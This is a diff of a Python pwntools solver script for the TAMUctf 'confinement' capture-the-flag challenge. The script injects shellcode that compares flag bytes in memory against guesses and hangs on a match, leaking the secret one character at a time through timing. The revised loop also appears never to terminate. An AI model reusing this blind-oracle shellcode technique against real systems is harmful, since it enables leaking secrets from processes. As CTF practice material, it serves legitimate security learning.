@@ -15,7 +15,7 @@ def start(argv=[], *a, **kw):
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     elif args.REMOTE: 
-        return remote("tamuctf.com", 443, ssl=True, sni="janky")
+        return remote("tamuctf.com", 443, ssl=True, sni="confinement")
     else:
         return process([exe.path] + argv, *a, **kw)
 
@@ -35,12 +35,13 @@ def init():
     io = start()
 
 def search(char, idx):
+    FLAG = 0x24d5a
     sc = asm(f"""
         loop:
-            mov r8, [rsp]
-            add r8, 0x24d5a
+            mov rax, [rsp]
+            add rax, {FLAG}
             
-            cmp BYTE PTR [r8 + {idx}], {char}
+            cmp BYTE PTR [rax + {idx}], {char}
             jne exit
             jmp $
     
@@ -55,17 +56,21 @@ def search(char, idx):
 
 
 def solve():
-    flag = "g"
+    flag = ""
     charset = string.printable
 
-    while flag[-1] != "}":
+    while True:
         for char in charset:
+            if char == '}':
+                break
+
             sys.stdout.write(f"Trying: {flag}{char}")
             init()
 
             print(len(flag))
             search(ord(char), len(flag))
             
+            # sleep(1)
             gotten = True
     
             try:
@@ -76,8 +81,6 @@ def solve():
                 gotten = False
             
             io.close()
-
-            print(flag)
 
             if gotten:
                 flag += char
